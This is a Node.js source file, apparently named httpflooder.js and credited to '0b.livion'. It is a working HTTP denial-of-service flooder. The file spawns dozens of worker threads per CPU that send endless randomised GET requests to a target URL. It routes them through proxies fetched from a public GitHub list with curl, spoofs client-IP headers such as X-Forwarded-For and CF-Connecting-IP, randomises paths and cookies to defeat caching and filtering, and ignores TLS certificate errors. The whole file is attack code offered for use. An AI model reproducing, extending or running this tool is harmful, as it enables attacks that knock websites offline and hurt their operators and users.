/** info
 * HTTP SDPR
 * Credits: 0b.livion
 */

"use strict";

const { Worker, isMainThread, workerData, parentPort } = require('worker_threads');
const os = require('os');
const dns = require('dns');
const http = require('http');
const https = require('https');
const { URL } = require('url');
const net = require('net');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const cluster = require('cluster');
const zlib = require('zlib');
const tls = require('tls');

function randInt(a, b) {
    return Math.floor(crypto.randomInt(a, b + 1));
}
function shuffle(arr) {
    for(let i = arr.length - 1; i > 0; i--) {
        let j = randInt(0, i);
        [arr[i], arr[j]] = [arr[j], arr[i]];
    }
}
function pick(arr) {
    return arr[randInt(0, arr.length - 1)];
}

function randIPv6() {
    return Array(8).fill(0).map(_=>randInt(0,0xffff).toString(16)).join(':');
}

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 16_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/604.1',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
];

const ACCEPTS = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'application/json, text/plain, */*',
    'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8'
];
const REFERRERS = [
    'https://google.com/',
    'https://twitter.com/',
    'https://www.youtube.com/',
    'https://duckduckgo.com/',
    'https://facebook.com/',
    '',
    'https://reddit.com/',
    'https://github.com/',
    'https://www.instagram.com/'
];

function getRandomIP() {
    if(Math.random()>0.5){
        return [0,0,0,0].map(_=>randInt(1,254)).join('.')
    }
    return randIPv6();
}

function getProxyList() {
    let proxies = [];
    const envPath = process.env.PROXY_LIST || path.join(__dirname, 'proxies.txt');
    if(fs.existsSync(envPath)) {
        proxies = proxies.concat(
            fs.readFileSync(envPath, 'utf8').split('\n').map(x=>x.trim()).filter(Boolean)
        );
    }
    try {
        if (proxies.length < 50) {
            const data = require('child_process').execSync(
                'curl -s "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"'
            ).toString();
            proxies = proxies.concat(data.split('\n').map(x=>x.trim()).filter(Boolean));
        }
    } catch(e) {}
    shuffle(proxies);
    proxies = Array.from(new Set(proxies));
    proxies = proxies.filter(x => /^[\w\.\-]+:\d+$/.test(x));
    return proxies;
}

function randPath() {
    let n = randInt(2,8);
    let frag = crypto.randomBytes(randInt(6,16)).toString('hex');
    let fake = `/${frag}${Math.random()>.6?'/' + frag.slice(-4):''}${Math.random()>.5?'.php':''}${Math.random()>.8?'.jsp':''}?${crypto.randomBytes(3).toString('hex')}=${randInt(1000,999999)}&c=${Date.now() * randInt(1,9)}&tick=${process.hrtime.bigint()}`;
    return fake;
}
function randQs() {
    const keys = ["v", "session", "ref", "sid", "token", "stamp", "x", "flux", "rnd"];
    return pick(keys) + '=' + crypto.randomBytes(randInt(2,7)).toString('hex') + '&' + pick(keys) + '=' + randInt(100,1e5);
}

function randomHeaders(urlStr) {
    let now = Date.now();
    let url = new URL(urlStr);
    let cookies = [
        'PHPSESSID=' + crypto.randomBytes(8).toString('hex'),
        'session=' + crypto.randomBytes(16).toString('base64'),
        `_gid=${now}`,
        `_ga=${randInt(1e4,1e8)}.${randInt(1e4,1e8)}`
    ];
    let encodings = [
        'gzip,deflate,br', 'deflate,br', 'gzip,deflate', 'identity'
    ];
    let headers = {
        'User-Agent': pick(USER_AGENTS),
        'Accept': pick(ACCEPTS),
        'Referer': pick(REFERRERS) || urlStr,
        'X-Forwarded-For': getRandomIP(),
        'X-Real-IP': getRandomIP(),
        'CF-Connecting-IP': getRandomIP(),
        'Forwarded': `for="${getRandomIP()}"`,
        'Via': `1.1 0b.livion-layers`,
        'Origin': url.origin,
        'Cookie': cookies.sort(()=>Math.random()-.5).join('; '),
        'Upgrade-Insecure-Requests': randInt(0,1),
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Accept-Encoding': pick(encodings),
        'Connection': 'keep-alive, Upgrade',
        'TE': pick(['trailers','']),
        'DNT': randInt(0,1),
        'Sec-Fetch-Site': pick(['same-origin','cross-site','none']),
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Mode': pick(['navigate','cors','no-cors']),
        'Sec-Fetch-Dest': pick(['document','image','script','style'])
    };
    Object.keys(headers).forEach(k => { if (typeof headers[k] === 'undefined') delete headers[k]; });
    return headers;
}

function floodThroughProxy(target, proxyStr, next) {
    let u;
    try { u = new URL(target); } catch(e) { next(); return;}
    const isHttps = u.protocol === 'https:';
    const [host, port] = proxyStr.split(':');
    let mpath = (Math.random()>.4?randPath():u.pathname) +
        (u.search?u.search:'') + (Math.random()>.8?'&':'?') + randQs();

    let headers = randomHeaders(target);
    let requestPayload = `GET ${mpath} HTTP/1.1\r\n` +
        `Host: ${u.hostname}\r\n` +
        Object.entries(headers).map(([k,v])=>`${k}: ${v}`).join('\r\n') + '\r\n\r\n';
    let destroyScheduled = false;

    let proxySocket = net.connect({
        host, port:Number(port),
        timeout: 4400 + randInt(0,3100)
    }, ()=>{
        if(isHttps) {
            let connectPayload = `CONNECT ${u.hostname}:443 HTTP/1.1\r\nHost: ${u.hostname}\r\n\r\n`;
            proxySocket.write(connectPayload);
            let resp = '';
            proxySocket.once('data', chunk=>{
                resp += chunk.toString();
                if (resp.match(/ 200 /)) {
                    let tlsSocket;
                    try {
                        tlsSocket = tls.connect({
                            socket: proxySocket,
                            servername: u.hostname,
                            ALPNProtocols:['http/1.1'],
                            minVersion:'TLSv1.2',
                            rejectUnauthorized:false
                        }, ()=>{
                            tlsSocket.write(requestPayload);
                            setTimeout(()=>{
                                if(!destroyScheduled) {
                                    destroyScheduled = true; tlsSocket.destroy();
                                }
                            }, randInt(260,4100));
                        });
                        tlsSocket.on('error',()=>{});
                        tlsSocket.on('data',()=>{});
                    } catch(e) { proxySocket.destroy(); }
                } else {
                    proxySocket.destroy();
                }
            });
        } else {
            proxySocket.write(requestPayload);
            setTimeout(()=>{
                if(!destroyScheduled){ destroyScheduled=true; proxySocket.destroy(); }
            }, randInt(88,2600));
        }
    });
    proxySocket.on('error',()=>{});
    proxySocket.on('end',()=>{});
    setTimeout(next, randInt(2,40));
}

function floodDirect(target, ip, cb) {
    let u;
    try { u=new URL(target); } catch(e){ return cb&&cb(); }
    const isHttps = u.protocol === 'https:';
    let mpath = (Math.random()>.35?randPath():u.pathname) + (u.search?u.search:'') + (Math.random()>.6?'&':'?') + randQs();
    let headers = randomHeaders(target);
    let opts = {
        host: ip,
        port: isHttps ? 443 : 80,
        method: 'GET',
        path: mpath,
        headers: Object.assign({}, headers, {Host:u.hostname}),
        rejectUnauthorized: false,
        timeout: randInt(900,4000)
    };
    let reqf = isHttps ? https : http;
    let completed = false;
    let req = reqf.request(opts,res=>{
        res.on('data',()=>{});
        res.on('error',()=>{});
        res.on('end',()=>{if(!completed && cb){completed=true;cb();}});
    });
    req.on('error',()=>{if(!completed && cb){completed=true;cb();}});
    req.setTimeout(randInt(114,4200), ()=>{ req.destroy(); if(!completed && cb){completed=true;cb();}});
    req.end();
}

function hopDns(target, cb) {
    let u;
    try { u = new URL(target);} catch(e){ return cb(target);}
    let tasks = [];
    tasks.push(function(dnsDone){
        dns.resolve4(u.hostname, (err,ips)=>{
            if (Array.isArray(ips)&&ips.length>0){
                let ip = pick(ips);
                let faked = u.protocol + '://' + ip + u.pathname + (u.search?u.search:'');
                dnsDone(faked, ip);
            } else {
                dnsDone(target);
            }
        });
    });
    tasks.push(function(dnsDone){
        dns.resolve6(u.hostname, (err,ips)=>{
            if (Array.isArray(ips)&&ips.length>0){
                let ip = pick(ips);
                let faked = u.protocol + '://' + '['+ip+']' + u.pathname + (u.search?u.search:'');
                dnsDone(faked, ip);
            } else {
                dnsDone(target);
            }
        });
    });
    let fired = false;
    let done = (fUrl, ip) => { if (!fired) { fired = true; cb(fUrl, ip); } };
    tasks.forEach(fn=>fn(done));
}

function endless(fn, interval=0, max=Infinity) {
    let count = 0;
    function again() {
        if (++count > max) return;
        fn(()=>{setTimeout(again, interval);});
    }
    again();
}

function hyperBatchFlood(target, proxies, concurrency, dnsHop, cb) {
    let pending = 0;
    let limit = Math.max(96, concurrency);
    for(let i=0;i<limit;i++) {
        let usingProxy = proxies.length>0 && Math.random()>0.15;
        if(usingProxy) {
            let chosen = pick(proxies);
            hopDns(target, (dnsTarget) => {
                floodThroughProxy(dnsTarget, chosen, ()=>{pending++; if(pending===limit)cb&&cb();});
            });
        } else if(dnsHop) {
            hopDns(target, (dnsTarget, ip) => {
                if(ip && randInt(1,4)!==1){
                    floodDirect(dnsTarget, ip, ()=>{pending++; if(pending===limit)cb&&cb();});
                } else {
                    setTimeout(()=>{pending++;if(pending===limit)cb&&cb();}, randInt(8,63));
                }
            });
        } else {
            setTimeout(()=>{pending++;if(pending===limit)cb&&cb();}, randInt(2,32));
        }
    }
}

function cpuFloodSpreader(target, proxies, multiplier, dnsHop) {
    let cpuCount = os.cpus().length;
    let threads = cpuCount * multiplier;
    for (let i = 0; i < threads; ++i) {
        let wrk = new Worker(__filename, {
            workerData: {
                target: target,
                id: i,
                proxies: proxies,
                multi: multiplier,
                dns_hop: dnsHop,
                power: true,
                author: "0b.livion"
            }
        });
        wrk.on('error',()=>{});
        wrk.on('exit',()=>{});
    }
}

if (isMainThread) {
    let proxies = getProxyList();
    let cpus = os.cpus().length, MULT = 50 + randInt(0,22);
    let totalWorkers = cpus * MULT + randInt(0,64);

    const targetFromArg = process.argv.find(arg=>/^https?:\/\//i.test(arg));
    if (!targetFromArg) {
        process.stderr.write('[0b.livion] Usage: node httpflooder.js http[s]://target.url\n');
        process.exit(2);
    }
    const TARGET = targetFromArg;

    cpuFloodSpreader(TARGET, proxies, MULT, true);
} else {
    let { target, id, proxies, multi, dns_hop, power, author } = workerData;
    const maxConcurrent = 128 + randInt(0,68);
    let cycles = 0;
    let active = true;

    async function superFloodCycle(next) {
        let start = Date.now();
        let cycleBatch = randInt(maxConcurrent/2, maxConcurrent);
        let chosenProxies = proxies.slice(randInt(0, Math.max(0,proxies.length-180)), randInt(80,proxies.length));
        shuffle(chosenProxies);
        let batchDone = 0;
        for(let i=0;i<cycleBatch;i++) {
            let usingProxy = (proxies.length && Math.random()<0.835);
            if(usingProxy) {
                let px = pick(chosenProxies);
                hopDns(target, (dnsTarget)=>{
                    floodThroughProxy(dnsTarget, px, ()=>{ batchDone++; if(batchDone===cycleBatch) next(); });
                });
            } else if (dns_hop) {
                hopDns(target, (dnsTarget, ip)=>{
                    if(ip && randInt(1,7) !== 1) {
                        floodDirect(dnsTarget, ip, ()=>{batchDone++; if(batchDone===cycleBatch) next();});
                    } else {
                        setTimeout(()=>{batchDone++; if(batchDone===cycleBatch) next();}, randInt(13,77));
                    }
                });
            } else {
                setTimeout(()=>{batchDone++; if(batchDone===cycleBatch) next();}, randInt(6,41));
            }
        }
        cycles++;
        if(cycles % 101 === 0) {
            process.stdout.write(`[${(author||"0b.livion")}] Thread#${id} cycles: ${cycles}, Duration: ${Date.now()-start}ms\n`);
        }
    }

    endless(superFloodCycle, randInt(2,28), process.env.MAX_CYCLE?Number(process.env.MAX_CYCLE):Infinity);
}
